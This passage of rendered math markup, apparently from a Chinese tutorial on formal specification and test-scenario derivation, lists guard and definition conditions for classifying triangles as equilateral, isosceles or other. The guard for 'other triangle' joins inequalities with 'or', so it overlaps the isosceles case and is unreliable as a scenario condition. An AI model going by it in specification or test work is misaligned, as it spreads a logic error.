</mtext><mi>t</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">Check_Triangle_{post}=(d1=d2 \; and \;d2=d3 \; t_{type}=&quot;equilateral\;triangle&quot;...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">ec</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">os</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">d</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;...</span></span></span></span></eq></li><li>根据以上specification可以得到以下功能场景<ul><li>（1）<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mo>:</mo><mi>d</mi><mn>1</mn><mo>=</mo><mi>d</mi><mn>2</mn><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><mi>d</mi><mn>2</mn><mo>=</mo><mi>d</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">G_1:d1=d2 \; and\; d2=d3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">3</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub><mo>:</mo><msub><mi>t</mi><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi></mrow></msub><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>e</mi><mi>q</mi><mi>u</mi><mi>i</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>a</mi><mi>l</mi><mtext>  </mtext><mi>t</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">D_1:t_{type} = &quot;equilateral\;triangle&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">u</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><msub><mi>S</mi><mn>1</mn></msub><mo>:</mo><msub><mi>G</mi><mn>1</mn></msub><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><msub><mi>D</mi><mn>1</mn></msub><mtext>  </mtext><mo stretchy="false">(</mo><mo>⇔</mo><mi>C</mi><mi>h</mi><mi>e</mi><mi>c</mi><msub><mi>k</mi><mi>T</mi></msub><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><msub><mi>e</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><mi>G</mi><mn>1</mn><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><mi>D</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FS_1:G_1\; and\;D_1 \; (\Leftrightarrow Check_Triangle_{pre}\; and \; G1 \; and\;D1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">(</span><span class="mrel">⇔</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">h</span><span class="mord mathnormal">ec</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">G</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></eq></li></ul></li><li>（2）<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>2</mn></msub><mo>:</mo><mi>d</mi><mn>1</mn><mo>=</mo><mi>d</mi><mn>2</mn><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mn>2</mn><mo>=</mo><mi>d</mi><mn>3</mn><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mn>1</mn><mo>=</mo><mi>d</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">G_2:d1=d2 \; or \; d2=d3 \; or \; d1=d3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord">3</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub><mo>:</mo><msub><mi>t</mi><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi></mrow></msub><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>i</mi><mi>s</mi><mi>o</mi><mi>s</mi><mi>c</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>s</mi><mtext>  </mtext><mi>t</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">D_2:t_{type} = &quot;isosceles\;triangle&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">i</span><span class="mord mathnormal">sosce</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">es</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><msub><mi>S</mi><mn>2</mn></msub><mo>:</mo><msub><mi>G</mi><mn>2</mn></msub><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><msub><mi>D</mi><mn>2</mn></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">FS_2:G_2\; and\;D_2 \;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span></span></span></eq></li></ul></li><li>（3）<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>3</mn></msub><mo>:</mo><mi>d</mi><mn>1</mn><mo>≠</mo><mrow></mrow><mi>d</mi><mn>2</mn><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mn>2</mn><mo>≠</mo><mrow></mrow><mi>d</mi><mn>3</mn><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mn>1</mn><mo>≠</mo><mrow></mrow><mi>d</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">G_3:d1\not ={}d2 \; or \; d2\not ={}d3 \; or \; d1\not ={}d3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"></span><span class="mord mathnormal">d</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">d</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"></span><span class="mord mathnormal">d</span><span class="mord">3</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>3</mn></msub><mo>:</mo><msub><mi>t</mi><mrow><mi>t</mi><mi>y</mi><mi>p</mi><mi>e</mi></mrow></msub><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mtext>  </mtext><mi>t</mi><mi>r</mi><mi>i</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">D_3:t_{type} = &quot;other \;triangle&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">ian</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord">&quot;</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><msub><mi>S</mi><mn>3</mn></msub><mo>:</mo><msub><mi>G</mi><mn>3</mn></msub><mtext>  </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext>  </mtext><msub><mi>D</mi><mn>3</mn></msub><mtext>  </mtext></mrow><annotation 